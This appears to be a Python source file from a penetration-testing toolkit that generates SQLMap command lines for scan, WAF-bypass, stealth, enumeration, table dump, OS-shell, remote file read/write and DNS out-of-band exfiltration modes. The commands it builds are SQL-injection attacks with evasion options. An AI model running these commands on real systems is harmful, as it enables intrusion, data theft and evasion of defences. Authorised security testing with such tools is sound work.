"""
Command Builder - Generate optimal SQLMap commands for specific scenarios.

Usage:
    python utils/command_builder.py --target "http://target.com/?id=1" --mode quick
    python utils/command_builder.py --target "http://target.com/?id=1" --mode waf --waf cloudflare --dbms mysql
    python utils/command_builder.py --interactive
"""

import argparse
import sys


class CommandBuilder:
    """Builds optimal SQLMap commands for common penetration testing scenarios."""

    BASE_CMD = "sqlmap"

    MODES = {
        "quick": "Fast first-pass detection",
        "deep": "Thorough coverage, all parameters",
        "stealth": "Low-and-slow, minimal footprint",
        "waf": "WAF bypass mode",
        "enum": "Database enumeration",
        "dump": "Data extraction",
        "shell": "OS shell access",
        "file": "File read/write operations",
        "dns": "OOB DNS exfiltration",
    }

    def __init__(self):
        from .tamper_selector import TamperSelector
        self.tamper_selector = TamperSelector()

    def build_quick(self, target, dbms=None, cookie=None, proxy=None):
        """Quick detection scan."""
        parts = [self.BASE_CMD]
        parts.append(f'-u "{target}"')
        if dbms:
            parts.append(f"--dbms={dbms}")
        if cookie:
            parts.append(f'--cookie="{cookie}"')
        if proxy:
            parts.append(f"--proxy={proxy}")
        parts.extend(["--batch", "--level=1", "--risk=1", "--random-agent"])
        return self._format(parts)

    def build_deep(self, target, dbms=None, cookie=None, proxy=None):
        """Deep comprehensive scan."""
        parts = [self.BASE_CMD]
        parts.append(f'-u "{target}"')
        if dbms:
            parts.append(f"--dbms={dbms}")
        if cookie:
            parts.append(f'--cookie="{cookie}"')
        if proxy:
            parts.append(f"--proxy={proxy}")
        parts.extend(["--batch", "--level=5", "--risk=3", "--random-agent",
                       "--threads=5"])
        return self._format(parts)

    def build_stealth(self, target, dbms=None, cookie=None):
        """Stealth low-and-slow scan."""
        parts = [self.BASE_CMD]
        parts.append(f'-u "{target}"')
        if dbms:
            parts.append(f"--dbms={dbms}")
        if cookie:
            parts.append(f'--cookie="{cookie}"')
        parts.extend(["--batch", "--level=1", "--risk=1", "--random-agent",
                       "--delay=3", "--threads=1"])
        return self._format(parts)

    def build_waf_bypass(self, target, waf, dbms="all", cookie=None):
        """WAF bypass mode with appropriate tampers."""
        tamper_chain = self.tamper_selector.build_chain(waf, dbms)

        parts = [self.BASE_CMD]
        parts.append(f'-u "{target}"')
        if dbms and dbms != "all":
            parts.append(f"--dbms={dbms}")
        if cookie:
            parts.append(f'--cookie="{cookie}"')
        parts.extend([
            f"--tamper={tamper_chain}",
            "--random-agent",
            "--delay=2",
            "--batch",
            "--level=2",
            "--risk=1",
            "--threads=2"
        ])
        return self._format(parts)

    def build_enumeration(self, target, dbms=None, technique=None, cookie=None,
                           tampers=None):
        """Database enumeration command."""
        parts = [self.BASE_CMD]
        parts.append(f'-u "{target}"')
        if dbms:
            parts.append(f"--dbms={dbms}")
        if technique:
            parts.append(f"--technique={technique}")
        if cookie:
            parts.append(f'--cookie="{cookie}"')
        if tampers:
            parts.append(f"--tamper={tampers}")
        parts.extend(["--current-user", "--current-db", "--is-dba", "--dbs",
                       "--batch", "--random-agent", "--threads=5"])
        return self._format(parts)

    def build_dump(self, target, database, table, columns=None, dbms=None,
                   technique=None, cookie=None, tampers=None, limit=None):
        """Data extraction command."""
        parts = [self.BASE_CMD]
        parts.append(f'-u "{target}"')
        if dbms:
            parts.append(f"--dbms={dbms}")
        if technique:
            parts.append(f"--technique={technique}")
        parts.append(f"-D {database}")
        parts.append(f"-T {table}")
        if columns:
            parts.append(f"-C {columns}")
        if cookie:
            parts.append(f'--cookie="{cookie}"')
        if tampers:
            parts.append(f"--tamper={tampers}")
        if limit:
            parts.append(f"--stop={limit}")
        parts.extend(["--dump", "--batch", "--random-agent", "--threads=5"])
        return self._format(parts)

    def build_shell(self, target, dbms=None, cookie=None, tampers=None):
        """OS shell access command."""
        parts = [self.BASE_CMD]
        parts.append(f'-u "{target}"')
        if dbms:
            parts.append(f"--dbms={dbms}")
        if cookie:
            parts.append(f'--cookie="{cookie}"')
        if tampers:
            parts.append(f"--tamper={tampers}")
        parts.extend(["--os-shell", "--batch", "--random-agent"])
        return self._format(parts)

    def build_file_read(self, target, file_path, dbms=None, cookie=None):
        """File read command."""
        parts = [self.BASE_CMD]
        parts.append(f'-u "{target}"')
        if dbms:
            parts.append(f"--dbms={dbms}")
        if cookie:
            parts.append(f'--cookie="{cookie}"')
        parts.extend([f"--file-read={file_path}", "--batch", "--random-agent"])
        return self._format(parts)

    def build_file_write(self, target, local_file, remote_dest, dbms=None, cookie=None):
        """File write command."""
        parts = [self.BASE_CMD]
        parts.append(f'-u "{target}"')
        if dbms:
            parts.append(f"--dbms={dbms}")
        if cookie:
            parts.append(f'--cookie="{cookie}"')
        parts.extend([
            f"--file-write={local_file}",
            f"--file-dest={remote_dest}",
            "--batch",
            "--random-agent"
        ])
        return self._format(parts)

    def build_dns_oob(self, target, dns_domain, dbms=None, cookie=None):
        """DNS OOB exfiltration command."""
        parts = [self.BASE_CMD]
        parts.append(f'-u "{target}"')
        if dbms:
            parts.append(f"--dbms={dbms}")
        if cookie:
            parts.append(f'--cookie="{cookie}"')
        parts.extend([
            "--technique=Q",
            f"--dns-domain={dns_domain}",
            "--batch",
            "--random-agent",
            "--threads=5"
        ])
        return self._format(parts)

    def _format(self, parts):
        """Format command parts into readable multi-line command."""
        if len(parts) <= 4:
            return " ".join(parts)

        # Multi-line format for readability
        first = parts[0] + " " + parts[1]
        rest = parts[2:]
        lines = [first] + ["  " + p for p in rest]
        return " \\\n".join(lines)

    def interactive(self):
        """Interactive command builder wizard."""
        print("\n=== SQLMap Command Builder ===\n")

        target = input("Target URL (with parameter, e.g. http://target.com/?id=1): ").strip()
        if not target:
            print("[!] Target required")
            sys.exit(1)

        print("\nMode options:")
        for mode, desc in self.MODES.items():
            print(f"  {mode:10} - {desc}")
        mode = input("\nMode [quick]: ").strip().lower() or "quick"

        dbms = input("DBMS (mysql/mssql/postgresql/oracle/blank for auto): ").strip().lower() or None
        cookie = input("Session cookie (blank if none): ").strip() or None
        proxy = input("Proxy (e.g. http://127.0.0.1:8080, blank if none): ").strip() or None

        cmd = self.build_for_mode(mode, target, dbms=dbms, cookie=cookie, proxy=proxy)
        print(f"\n[+] Generated command:\n\n{cmd}\n")
        return cmd

    def build_for_mode(self, mode, target, **kwargs):
        """Build command for a specific mode."""
        builders = {
            "quick": self.build_quick,
            "deep": self.build_deep,
            "stealth": self.build_stealth,
            "enum": self.build_enumeration,
        }
        if mode in builders:
            return builders[mode](target, **{k: v for k, v in kwargs.items()
                                             if k in ["dbms", "cookie", "proxy", "tampers", "technique"]})
        return self.build_quick(target, **{k: v for k, v in kwargs.items()
                                           if k in ["dbms", "cookie", "proxy"]})


def main():
    parser = argparse.ArgumentParser(description="SQLMap Command Builder")
    parser.add_argument("--target", help="Target URL with parameter")
    parser.add_argument("--mode", choices=list(CommandBuilder.MODES.keys()),
                        default="quick", help="Scan mode")
    parser.add_argument("--waf", help="WAF vendor (for waf mode)")
    parser.add_argument("--dbms", help="Database type")
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--proxy", help="HTTP proxy")
    parser.add_argument("--tampers", help="Tamper scripts (comma-separated)")
    parser.add_argument("--database", help="Target database (for dump mode)")
    parser.add_argument("--table", help="Target table (for dump mode)")
    parser.add_argument("--file", help="File path (for file-read mode)")
    parser.add_argument("--dns-domain", help="DNS domain (for dns mode)")
    parser.add_argument("--interactive", action="store_true", help="Interactive wizard")
    args = parser.parse_args()

    builder = CommandBuilder()

    if args.interactive:
        builder.interactive()
        return

    if not args.target:
        parser.print_help()
        sys.exit(1)

    if args.mode == "quick":
        cmd = builder.build_quick(args.target, args.dbms, args.cookie, args.proxy)
    elif args.mode == "deep":
        cmd = builder.build_deep(args.target, args.dbms, args.cookie, args.proxy)
    elif args.mode == "stealth":
        cmd = builder.build_stealth(args.target, args.dbms, args.cookie)
    elif args.mode == "waf":
        waf = args.waf or "generic"
        cmd = builder.build_waf_bypass(args.target, waf, args.dbms or "all", args.cookie)
    elif args.mode == "enum":
        cmd = builder.build_enumeration(args.target, args.dbms, cookie=args.cookie, tampers=args.tampers)
    elif args.mode == "dump" and args.database and args.table:
        cmd = builder.build_dump(args.target, args.database, args.table,
                                  dbms=args.dbms, cookie=args.cookie, tampers=args.tampers)
    elif args.mode == "shell":
        cmd = builder.build_shell(args.target, args.dbms, args.cookie, args.tampers)
    elif args.mode == "file" and args.file:
        cmd = builder.build_file_read(args.target, args.file, args.dbms, args.cookie)
    elif args.mode == "dns" and args.dns_domain:
        cmd = builder.build_dns_oob(args.target, args.dns_domain, args.dbms, args.cookie)
    else:
        cmd = builder.build_quick(args.target, args.dbms, args.cookie, args.proxy)

    print(cmd)


if __name__ == "__main__":
    main()
